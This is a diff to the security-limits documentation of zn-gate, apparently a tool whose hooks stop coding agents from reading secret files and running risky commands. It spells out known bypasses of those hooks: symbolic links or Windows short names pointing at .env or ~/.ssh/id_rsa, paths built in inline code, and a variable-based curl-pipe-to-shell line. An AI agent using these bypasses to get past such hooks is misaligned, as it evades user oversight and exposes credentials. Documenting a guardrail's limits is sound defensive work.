@@ -58,7 +58,7 @@ reads, command output, search results, MCP results and pasted prompts.
 | **Copies kept by the agent on your disk** | See below. |
 | **Restoring an old `secrets.age`, with or without its old `audit.jsonl`** | The log still verifies against the older checkpoint, so the check passes. Detecting it needs an anchor outside `~/.zn` (a Team upload of the log is one). |
 | **Records of the last minute if the vault process is killed** | The vault saves its checkpoint every minute and when it locks. Records written after the last save can be cut without notice if the process is killed before the next save. |
-| **A symbolic link or a Windows short name that points at a protected file** | The path checks read the text of a path; they do not look at the disk. A link such as `notes.txt` that points at `.env` or `~/.ssh/id_rsa`, or a short name such as `PROGRA~1`, is not recognised as the protected file. Keep secrets in the vault or outside the project folder. The coding-agent hooks of the npm package also resolve the real path of the agents' own configuration files. |
+| **A symbolic link or a Windows short name that points at a protected file** | The read checks for secret files read the text of a path; they do not look at the disk. A link such as `notes.txt` that points at `.env` or `~/.ssh/id_rsa`, or a short name such as `PROGRA~1`, is not recognised as the protected file. Keep secrets in the vault or outside the project folder. Only the protection of `~/.zn` and of the agents' own configuration files, described below, resolves links: the coding-agent hooks of the npm package follow them to the real path. |
 
 zn-gate is not a sandbox, and how much it sees depends on the agent (see
 [compat.md](compat.md)). Hooks are a guardrail: a determined process can find another
@@ -75,7 +75,7 @@ removes or enters one of those directories is refused, and so is a write to a
 file in it. This is best effort: a write the hooks cannot read as a word of the
 command (a path built inside a script, in inline code such as
 `python -c "open(...)"`, or with a variable set earlier in the same command) is
-not seen. Paths are checked after `~`, variables and symlinks are resolved,
+not seen. For these files and folders, paths are checked after `~`, variables and symlinks are resolved,
 and globs and brace lists are checked against the files that exist now and
 against the names they could match.
 
@@ -573,11 +573,14 @@ stop malware running as the same user (see above).
 - **Rollback of the vault file:** restoring an older, genuine copy of
   `secrets.age` is accepted, and brings back the approvals and policy it had.
   Keep backups of `~/.zn` private.
-- **Command rules read the quoting of one line, not its variables.** The
-  download-and-run and startup-file rules decode shell quoting before they look
-  at a command (quotes, a backslash inside a word, `$'\x63url'`), but they do not
-  follow a variable: `C=curl; $C https://example.com/i.sh | sh` is not seen. The
-  rules are a guardrail against mistakes, not a sandbox.
+- **Command rules read one line.** The download-and-run and startup-file rules
+  decode shell quoting before they look at a command (quotes, a backslash inside
+  a word, `$'\x63url'`) and fill in a variable given a literal value earlier on
+  the same line (`C=curl; $C https://example.com/i.sh | sh` is blocked). They do
+  not follow a value set by an earlier tool call, by `read` or by a command
+  substitution. Both rules are off by default in the agent hooks (see
+  [Destructive commands](destructive-commands.md)). The rules are a guardrail
+  against mistakes, not a sandbox.
 - **A protected name that no text spells is not read.** Each expansion in a command (`${NAME}`, `$NAME`, `$(...)`, backticks, cmd.exe
   `%NAME%` and `!NAME!` units) is read as any text, whatever the environment the hook sees holds. A path segment is refused when it holds
   such an expansion and at least two literal characters of `.env`, `.env.*` or an SSH private key name in the places they have in
